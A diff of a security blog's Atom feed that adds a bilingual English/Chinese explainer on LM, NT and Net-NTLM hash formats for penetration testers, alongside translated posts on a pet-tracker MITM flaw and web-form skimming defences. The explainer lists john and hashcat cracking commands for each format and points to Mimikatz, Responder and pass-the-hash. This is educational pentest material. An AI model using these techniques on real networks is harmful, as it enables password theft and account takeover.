@@ -1,4 +1,247 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.3">Jekyll</generator><link href="https://security-onigiri.github.io//feed.xml" rel="self" type="application/atom+xml" /><link href="https://security-onigiri.github.io//" rel="alternate" type="text/html" /><updated>2018-07-07T20:38:22+08:00</updated><id>https://security-onigiri.github.io//</id><entry><title type="html">寵物追踪器對MITM攔截攻擊毫不設防</title><link href="https://security-onigiri.github.io//2018/06/12/mitm.html" rel="alternate" type="text/html" title="寵物追踪器對MITM攔截攻擊毫不設防" /><published>2018-06-12T00:00:00+08:00</published><updated>2018-06-12T00:00:00+08:00</updated><id>https://security-onigiri.github.io//2018/06/12/mitm</id><content type="html" xml:base="https://security-onigiri.github.io//2018/06/12/mitm.html">&lt;p&gt;&lt;a href=&quot;https://threatpost.com/author/sealstara/&quot;&gt;Tara Seals&lt;/a&gt; ‧ 2018年5月25日下午3:25&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.1">Jekyll</generator><link href="https://security-onigiri.github.io//feed.xml" rel="self" type="application/atom+xml" /><link href="https://security-onigiri.github.io//" rel="alternate" type="text/html" /><updated>2018-07-07T22:49:41+08:00</updated><id>https://security-onigiri.github.io//</id><entry><title type="html">LM, NTLM, Net-NTLMv2 我的天呀！</title><link href="https://security-onigiri.github.io//2018/07/07/lm-ntlm-net-ntlmv2.html" rel="alternate" type="text/html" title="LM, NTLM, Net-NTLMv2 我的天呀！" /><published>2018-07-07T00:00:00+08:00</published><updated>2018-07-07T00:00:00+08:00</updated><id>https://security-onigiri.github.io//2018/07/07/lm-ntlm-net-ntlmv2</id><content type="html" xml:base="https://security-onigiri.github.io//2018/07/07/lm-ntlm-net-ntlmv2.html">&lt;h1 id=&quot;lm-ntlm-net-ntlmv2-oh-my&quot;&gt;LM, NTLM, Net-NTLMv2, oh my!&lt;/h1&gt;
+
+&lt;p&gt;When attacking AD, passwords are stored and sent in different ways, dependeing on both where you find it and the age of the domain. Most of these hashes are confusingly named, and both the hash name and the authentication protocol is named almost the same thing. It doesn’t help that every tool, post and guide that mentions credentials on Windows manage to add to the confusion. This is my attempt at clearing things up.&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;當攻擊 AD 時通行碼被用各種不同的方式儲存與傳送，視你在哪找到跟 domain 的年紀而定。大部分的雜湊的命名都很讓人疑惑，而且雜湊名稱與驗證協議幾乎是一樣的稱呼。在任何工具、文章及指南中提到 Windows 身分驗證資時更增加了困惑度。&lt;a href=&quot;https://xkcd.com/927/&quot;&gt;弄清楚些事情&lt;/a&gt;，是我的主要目的。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;This post is geared towards pentesters in an AD environment, and it favors practical attacks against the different hash formats. A lot of inspiration is taken from byt3bl33der’s awesome article, “Practical guide to NTLM Relaying in 2017”. If I’m missing something, please hit me up.&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;這篇是滲透測試者置身於 AD 環境面向的文章，而且偏向於對於不同雜湊格式的實際攻擊。受到 byt3bl33der 超棒的文章 “&lt;a href=&quot;https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html&quot;&gt;Practical guide to NTLM Relaying in 2017&lt;/a&gt;” 超大的啟發，如果我漏了什麼請&lt;a href=&quot;https://twitter.com/petergombos&quot;&gt;讓我知道&lt;/a&gt;。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;All example hashes are from Hashcat’s example hashes page. The hashes I’m looking at is LM, NT, and NTLM (version 1 and 2).&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;所有的範例雜湊都是從 Hashcat 的&lt;a href=&quot;https://hashcat.net/wiki/doku.php?id=example_hashes&quot;&gt;範例雜湊頁面&lt;/a&gt;來的。我正在研究的雜湊是 LM, NT 及 NTLM(版本 1 跟 2)。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;lm&quot;&gt;LM&lt;/h2&gt;
+&lt;p&gt;About the hash&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;關於這個雜湊&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;LM-hashes is the oldest password storage used by Windows, dating back to OS/2 in the 1980’s. Due to the limited charset allowed, they are fairly easy to crack. You can obtain them, if still available, from the SAM database on a Windows system, or the NTDS database on the Domain Controller. LM was turned off by default starting in Windows Vista/Server 2008, but might still linger in a network if there older systems are still used. It is possible to enable it in later versions through a GPO setting (even Windows 2016/10).&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;時間回溯到 1980 年代的 OS/2，LM 雜湊是 Windows 所使用最古老的通行碼儲存方式。因為字元集的限制，他們很容易被破解。你可以在 Windows 系統上的 SAM 資料庫或是 Domain 控制伺服器的 NTDS 資料庫輕易地取得。LM 從 Windows Vista/Server 2008 開始預設是關閉的，但還是有可能徘徊一個擁有古老一點的系統網路中。在新一點的版本中可以 &lt;a href=&quot;https://support.microsoft.com/en-us/help/299656/how-to-prevent-windows-from-storing-a-lan-manager-hash-of-your-passwor&quot;&gt;GPO 設定&lt;/a&gt;開啟(在 Windows 2016/10 也可以)。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;When dumping the SAM/NTDS database, they are shown together with the NTHash, before the colon.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;將 SAM/NTDS 的資料倒出來的時候，你會看到分號前的是 NT 雜湊。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Example&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;例如&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;299BD128C1101FD6&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;The algorithm&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;演算法&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. Convert all lower case to upper case
+2. Pad password to 14 characters with NULL characters
+3. Split the password to two 7 character chunks
+4. Create two DES keys from each 7 character chunk
+5. DES encrypt the string &quot;KGS!@#$%&quot; with these two chunks
+6. Concatenate the two DES encrypted strings. This is the LM hash.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. 將所有的字元轉成大寫
+2. 用 NULL 字元將通行碼補到 14 個字元
+3. 將通行碼分成兩堆，一堆 7 個字元
+4. 為兩堆通行碼各產生一個 DES 密鑰
+5. 兩堆跟字串&quot;KGS!@#$%&quot;一起做 DES 加密
+6. 將兩個 DES 加密後的字串串在一起。這就是 LM 雜湊。
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Cracking it&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;破解&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;john --format=lm hash.txt
+hashcat -m 3000 -a 3 hash.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;nthash-aka-ntlm&quot;&gt;NTHash (A.K.A NTLM)&lt;/h2&gt;
+&lt;p&gt;About the hash&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;關於這個雜湊&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;This is the way passwords are stored on modern Windows systems, and can be obtained by dumping the SAM database, or using Mimikatz. They are also stored on domain controllers in the NTDS file. These are the hashes you can use to pass-the-hash.&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;這是當前流行的 Windows 系統所使用的通行碼儲存方式，可以從 SAM 資料庫倒出來或使用 Mimikatz 來取得。他們也被存在 Domain 控制伺服器上的 NTDS 檔案中。這是你可以用來 &lt;a href=&quot;https://en.wikipedia.org/wiki/Pass_the_hash&quot;&gt;pass-the-hash&lt;/a&gt; 的雜湊。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Usally pepole call this the NTLM hash (or just NTLM), which is misleading, as Microsoft refers to this as the NTHash (at least in some places). I personally recommend to call it the NTHash, to try to avoid confusion.&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;通常人們稱之為 NTLM 雜湊(或就是 NTLM)，當 Miscrosoft 提到這個 NT 雜湊(至少在某些地方)的時候非常的誤導。我個人建議稱它為 NT 雜湊以避免混淆。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Example&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;例子&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;B4B9B02E6F09A9BD760F388B67351E2B&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;The algorithm&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;演算法&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;MD4(UTF-16-LE(password))&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;UTF-16-LE is the little endian UTF-16. Windows used this instead of the standard big endian, because &lt;em&gt;Microsoft&lt;/em&gt;.&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;UTF-16-LE 是 逆序(編按:小頭端)版本的 UTF-16。Windos 使用這個而非順序(編按: 大頭端)，因為它是&lt;em&gt;微軟&lt;/em&gt;。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Cracking it&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;破解它&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;john --format=nt hash.txt
+hashcat -m 1000 -a 3 hash.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;ntlmv1-aka-net-ntlmv1&quot;&gt;NTLMv1 (A.K.A Net-NTLMv1)&lt;/h2&gt;
+&lt;p&gt;About the hash&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;關於這個雜湊&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;The NTLM protocol uses the NTHash in a challenge/response between a server and a client. The v1 of the protocol uses both the NT and LM hash, depending on configuration and what is available. The Wikipedia page on NT Lan Manager has a good explanation.&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;NTLM 協議在伺服器與客戶端挑戰/回應中使用 NT 雜湊。版本1基於設定與可用性來決定是否同時使用了 NT 與 LM 雜湊，維基百科上關於 &lt;a href=&quot;https://en.wikipedia.org/wiki/NT_LAN_Manager#NTLMv1&quot;&gt;NT 內網管理者&lt;/a&gt;有很好的解釋。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;A way of obtaining a response to crack from a client, Responder is a great tool. The value to crack would be the &lt;code class=&quot;highlighter-rouge&quot;&gt;K1 | K2 | K3&lt;/code&gt; from the algorithm below. Version 1 is deprecated, but might still be used in some old systems on the network.&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;一個從客戶端取得回應並破解的方法，&lt;a href=&quot;https://github.com/lgandx/Responder&quot;&gt;Responder 是一個很好用的工具&lt;/a&gt;。需要破解的值將會是下面演算法提到的 &lt;code class=&quot;highlighter-rouge&quot;&gt;k1 | k2 | k3&lt;/code&gt;。版本1已經不建議使用了，但仍舊可能會被一些網路上老舊的系統使用。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Example&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;例子&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;u4-
+netntlm::kNS:338d08f8e26de93300000000000000000000000000000000:9526fb8c23a90751cdd619b6cea564742e1e4bf33006ba41:cb8086049ec4736c
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The algorithm&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;演算法&lt;/p&gt;
+  &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c = 8-byte server challenge, random
+K1 | K2 | K3 = LM/NT-hash | 5-bytes-0
+response = DES(K1, C) | DES(K2, C) | DES(K3, C)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;  &lt;/div&gt;
+&lt;/blockquote&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c = 8 個位元組的伺服器挑戰，隨機的
+K1 | K2 | K3 = LM/NT 雜湊 | 5 位元組個 0
+response = DES(K1, C) | DES(K2, C) | DES(K3, C)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Cracking it&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;打破它&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;john --format=netntlm hash.txt
+hashcat -m 5500 -a 3 hash.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;ntlmv2-aka-net-ntlmv2&quot;&gt;NTLMv2 (A.K.A Net-NTLMv2)&lt;/h2&gt;
+&lt;p&gt;About the hash&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;關於這個雜湊&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;This is the new and improved version of the NTLM protocol, which makes it a bit harder to crack. The concept is the same as NTLMv1, only different algorithm and responses sent to the server. Also captured through Responder or similar. Defualt in Windows since Windows 2000.&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;這是 NTLM 協議最新並且改進過的版本，讓它更難被破解。整個概念跟 NTLMv1 一樣，只有送回伺服器的演算法與回應不同。還是可以用 Responder 或是類似工具擷取到。從 Windows 2000 預設開啟。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Example&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;例子&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;admin::N46iSNekpT:08ca45b7d7ea58ee:88dcbe4446168966a153a0064958dac6:5c7830315c7830310000000000000b45c67103d07d7b95acd12ffa11230e0000000052920b85f78d013c31cdb3b92f5d765c783030
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The algorithm&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;演算法&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SC = 8-byte server challenge, random
+CC = 8-byte client challenge, random
+CC* = (X, time, CC2, domain name)
+v2-Hash = HMAC-MD5(NT-Hash, user name, domain name)
+LMv2 = HMAC-MD5(v2-Hash, SC, CC)
+NTv2 = HMAC-MD5(v2-Hash, SC, CC*)
+response = LMv2 | CC | NTv2 | CC*
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SC = 8 位元組伺服器的挑戰，隨機的
+CC = 8 位元組客戶端的挑戰，隨機的
+CC* = (X, time, CC2, domain 名稱)
+v2-Hash = HMAC-MD5(NT-Hash, 使用者名稱, domain 名稱)
+LMv2 = HMAC-MD5(v2-Hash, SC, CC)
+NTv2 = HMAC-MD5(v2-Hash, SC, CC*)
+response = LMv2 | CC | NTv2 | CC*
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Cracking it&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;搞它&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;john --format=netntlmv2 hash.txt
+hashcat -m 5600 -a 3 hash.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;in-summary--總結&quot;&gt;IN SUMMARY / 總結&lt;/h2&gt;
+
+&lt;p&gt;LM-and NT-hashes are ways Windows stores passwords. NT is confusingly also known as NTLM. Can be cracked to gain password, or used to pass-the-hash.&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;LM 與 NT 雜湊是Windows 不同儲存通行碼的方式。NT 本身是非常令人疑惑的也被當成是 NTLM。可以被破解並取得通行碼，或是用在 pass-the-hash。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;NTLM-v1/v2 are challenge response protocols used for authentication in Windows environments. These use the NT-hash in the algorithm, which means it can be used to recover the password through Brute Force/Dictionary attacks. They can also be used in a relay attack, see byt3bl33d3r’s article [1].&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;NTLM-v1/v2 是挑戰與回應協議，用來在 Windows 環境中認證用的。這些在演算法中用了 NT 雜湊，表示可以用窮舉/字典攻擊來取得通行碼。也可以被用在轉傳攻擊，可以看看 byt3bl33d3r 的文章[1]。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;If you’re still confused, I would recommend reading the Wikipedia articls. I do hope this intro clears up the confusing language and can somehow help you.&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;如果你還是很疑惑，我推薦你讀維基百科的文章。我希望這個簡介解開了一些疑惑，並可以幫助到你們。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;sources--資料來源&quot;&gt;Sources / 資料來源&lt;/h3&gt;
+
+&lt;p&gt;[1] https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html&lt;/p&gt;
+
+&lt;p&gt;[2] https://technet.microsoft.com/en-us/library/dd277300.aspx#ECAA&lt;/p&gt;
+
+&lt;p&gt;[3] https://en.wikipedia.org/wiki/LAN_Manager&lt;/p&gt;
+
+&lt;p&gt;[4] https://en.wikipedia.org/wiki/NT_LAN_Manager&lt;/p&gt;
+
+&lt;p&gt;[5] https://en.wikipedia.org/wiki/Security_Account_Manager&lt;/p&gt;
+
+&lt;p&gt;[6] https://hashcat.net/wiki/doku.php?id=example_hashes&lt;/p&gt;</content><author><name>jhe</name></author><summary type="html">LM, NTLM, Net-NTLMv2, oh my!</summary></entry><entry><title type="html">寵物追踪器對MITM攔截攻擊毫不設防</title><link href="https://security-onigiri.github.io//2018/06/12/mitm.html" rel="alternate" type="text/html" title="寵物追踪器對MITM攔截攻擊毫不設防" /><published>2018-06-12T00:00:00+08:00</published><updated>2018-06-12T00:00:00+08:00</updated><id>https://security-onigiri.github.io//2018/06/12/mitm</id><content type="html" xml:base="https://security-onigiri.github.io//2018/06/12/mitm.html">&lt;p&gt;&lt;a href=&quot;https://threatpost.com/author/sealstara/&quot;&gt;Tara Seals&lt;/a&gt; ‧ 2018年5月25日下午3:25&lt;/p&gt;
 
 &lt;p&gt;家寵與我們非常親近，所以智慧頸環和其他能跟踪他們位置的動物裝置變得越來越流行;畢竟一個無需張貼丟失寵物傳單的世界絕對是個美好的世界，對吧？但據研究人員指稱，這件事的問題在於這些裝置可能會洩露敏感信息，例如電話號碼，寵物的位置或家庭網路的拓蹼。&lt;/p&gt;
 
@@ -1703,455 +1946,4 @@ These secondary options, which give me okay speeds, allow me backups if shomethi
   &lt;p&gt;在留言分享&lt;/p&gt;
 &lt;/blockquote&gt;
 
-&lt;hr /&gt;</content><author><name>jhe</name></author><category term="privacy" /><summary type="html">Taking privacy seriously leaving google behind</summary></entry><entry><title type="html">第2部分：如何阻止我從您的網站收集信用卡號碼和密碼</title><link href="https://security-onigiri.github.io//2018/03/07/2.html" rel="alternate" type="text/html" title="第2部分：如何阻止我從您的網站收集信用卡號碼和密碼" /><published>2018-03-07T00:00:00+08:00</published><updated>2018-03-07T00:00:00+08:00</updated><id>https://security-onigiri.github.io//2018/03/07/2</id><content type="html" xml:base="https://security-onigiri.github.io//2018/03/07/2.html">&lt;p&gt;我&lt;a href=&quot;https://hackernoon.com/im-harvesting-credit-card-numbers-and-passwords-from-your-site-here-s-how-9a8cb347c5b5&quot;&gt;最近有寫了一篇文章，&lt;/a&gt;描述了我如何散布惡意代碼，以非常難以檢測的方式從數千個網站收集信用卡號和密碼。&lt;/p&gt;
-
-&lt;p&gt;這個帖子所收到的評論讓我十分愉悅，多數人表達了“令人不寒而慄”、“令人不安”和“非常恐怖”等情緒。（就像在舞池裡得到讚美一樣）&lt;/p&gt;
-
-&lt;p&gt;作為後續的文章，我想我該停止加深恐懼，並提出一些實際的建議。&lt;/p&gt;
-
-&lt;h3 id=&quot;簡短的版本&quot;&gt;簡短的版本&lt;/h3&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;沒有必要嘗試和避免第三方代碼&lt;/li&gt;
-  &lt;li&gt;在收集或顯示敏感訊息時，請將此信息擷取到不包含第三方JavaScript的單獨HTML中&lt;/li&gt;
-  &lt;li&gt;在iframe中顯示文檔&lt;/li&gt;
-  &lt;li&gt;從另一個域上的靜態文件伺服器上提供文檔&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;您也可以考慮完全避免使用第三方登錄和使用第三方程式(插件)來收集和處理信用卡訊息等敏感數據。&lt;/p&gt;
-
-&lt;p&gt;我在這篇文章中提出的建議只適用於非常有限的敏感訊息（密碼、信用卡號碼等）且可以敏感訊息封鎖的網站。如果您在聊天應用程式、電子郵件客戶端或GUI數據庫上工作，那麼&lt;strong&gt;一切&lt;/strong&gt;都可能是敏感訊息，這點恕我無計可施。&lt;/p&gt;
-
-&lt;h3 id=&quot;十八倍的版本&quot;&gt;十八倍的版本&lt;/h3&gt;
-
-&lt;p&gt;我認為居安思危是一個好的開始。&lt;/p&gt;
-
-&lt;p&gt;我建議您思考一下，OnePlus &lt;a href=&quot;https://forums.oneplus.net/threads/jan-19-update-an-update-on-credit-card-security.752415/&quot;&gt;最近宣布&lt;/a&gt;：&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;…一個惡意腳本被注入到支付頁面的代碼中，以便在進入時嗅探信用卡信息…惡意腳本間歇性地運作，直接從用戶的瀏覽器捕獲並發送數據… oneplus.net上的多達4萬個用戶可能受到事件影響&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;慘。&lt;/p&gt;
-
-&lt;hr /&gt;
-
-&lt;p&gt;現在讓我們把這種模糊的恐懼感變成更具體的東西吧。&lt;/p&gt;
-
-&lt;p&gt;也許給一個場景描述是更為有用的…&lt;/p&gt;
-
-&lt;p&gt;我們想像&lt;strong&gt;第三方代碼&lt;/strong&gt;是一個大杜賓。牠看起來很平靜、溫柔。但是在牠漆黑且不帶感情的眼睛裡，卻有著未知的危險閃爍著。讓我們十分慶幸我們沒有把我們喜愛的東西放在附近觸怒牠。&lt;/p&gt;
-
-&lt;p&gt;現在我把我們用戶的&lt;strong&gt;敏感訊息&lt;/strong&gt;描繪成一個可愛且毫無防備的倉鼠。我們看著牠天真地舔著牠的小前腳，梳理著牠那笨拙的臉，在杜賓犬的尾巴處嬉鬧不已。&lt;/p&gt;
-
-&lt;p&gt;現在，如果你曾經與一個杜賓犬（我強烈推薦它）當過朋友，你可能知道牠們是美好、溫柔的生物，這並不與他們的惡名相符。但是，我相信你肯定會同意不該放杜賓犬與一個看起來和狗狗用的咀嚼玩具差不多的倉鼠單獨共處一室。&lt;/p&gt;
-
-&lt;p&gt;當然，也許你下班回家，有機會看到動物方城市中和平相處充滿愛的場面。而，也有可能你回家只能呼吸倉鼠生前曾經呼吸過的空氣，與一隻像在說“好了，現在可以上飯後甜點了嗎？”而把頭朝下看菜單的狗。&lt;/p&gt;
-
-&lt;hr /&gt;
-
-&lt;p&gt;我不認為該把來自npm、GTM、DFP或任何其他地方的代碼貼上惡意的標籤。但是我建議，除非你能保證這個代碼的行為良好，否則讓它經手你的用戶敏感訊息是對自己的不負責任。&lt;/p&gt;
-
-&lt;p&gt;所以…這是我建議我們都採用的心態：&lt;strong&gt;敏感訊息&lt;/strong&gt;和&lt;strong&gt;第三方代碼&lt;/strong&gt;應該隔離而不放在一起。&lt;/p&gt;
-
-&lt;h4 id=&quot;例如修復易受攻擊的網站&quot;&gt;例如：修復易受攻擊的網站&lt;/h4&gt;
-
-&lt;p&gt;這個例子中的網站有一個常見的信用卡表格，它很容易受到惡意的第三方代碼的侵害，就像在那幾個非常大的電子商務網站上的那樣，你可能認為這些大網站的安全性更好。&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://cdn-images-1.medium.com/max/1000/1*GgGOpt0c8n3tzkdddFJ2ew.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;好的，我知道，我的程式之路耽誤了我的設計天份。&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/ezxNzJl.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;所以這個頁面&lt;strong&gt;充滿&lt;/strong&gt;了第三方代碼。它使用React，並且使用Create React App創建，所以在我開始做些甚麼之前它就先塞了我886 npm封包（認真）。&lt;/p&gt;
-
-&lt;p&gt;它也有Google Tag Manager（如果您不知道，GTM對於那些您從來沒有遇過的人來說是一個十分方便的攻擊方法，它可以在不妨礙代碼審查的情況下將JavaScript注入到您的網站中）。&lt;/p&gt;
-
-&lt;p&gt;為了讓這頁面更像樣，我還補了一個橫幅廣告（怒秀一波）。這是一個在網路上的廣告，所以自然需要1.5 MB的JavaScript來分出112個封包請求在11秒全面傾占CPU資源來加載一個反覆騎馬的信用卡gif動畫。&lt;/p&gt;
-
-&lt;p&gt;（場邊嘮叨：我對Google很失望，他們的開發者主張花費大量的時間教會我們如何快速地創建網頁，在這里和幾毫秒之內削減幾萬字節 - 這的確是很棒的東西。但他們允許他們的DFP廣告網路向用戶的設備發送&lt;strong&gt;幾兆字節&lt;/strong&gt;，發出&lt;strong&gt;數百個&lt;/strong&gt;網路請求，並在CPU上停留整整&lt;strong&gt;一秒&lt;/strong&gt;。Google，我知道您有有顆能想出提供更智能，更快速的廣告投放方式的腦袋，您為什麼不用呢？）&lt;/p&gt;
-
-&lt;hr /&gt;
-
-&lt;p&gt;好的，回到這篇的主題……顯然，我需要做的是從所有&lt;strong&gt;第三方代碼&lt;/strong&gt;的骯髒的手中區隔出用戶的&lt;strong&gt;敏感信息&lt;/strong&gt; ; 我們希望以這種形式活在自己的小島上。&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://cdn-images-1.medium.com/max/2000/1*bjTH5qkIW8kyu1qqXaIFQA.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;第一步：為縮略圖找一張漂亮的照片。第二步：編寫一個涉及帖子主題和選擇縮略圖的陳腐隱喻&lt;/code&gt;&lt;/p&gt;
-
-&lt;hr /&gt;
-
-&lt;p&gt;現在我們正通過這篇文章的五分之二，我將開始實際描述一些方法。&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;選項1：將信用卡表單移至其自己的文檔，不含第三方JavaScript，並將其作為單獨的頁面提供&lt;/li&gt;
-  &lt;li&gt;選項2：與選項1相同，但頁面在iframe中提供&lt;/li&gt;
-  &lt;li&gt;選項3：與選項2相同，但是父頁面和iframe通過相互通信 &lt;code class=&quot;highlighter-rouge&quot;&gt;postMessage&lt;/code&gt;傳遞訊息&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h4 id=&quot;選項1為敏感數據分頁&quot;&gt;選項1：為敏感數據分頁&lt;/h4&gt;
-
-&lt;p&gt;最簡單的事情就是創建一個沒有JavaScript的全新頁面。當用戶點擊“購買”時，我們會把它們轉送到下圖的新頁面視窗，而不是以一些柔順流暢(為了某些美學、使用觀感的理由)的形式載入在當前頁面：&lt;/p&gt;
-
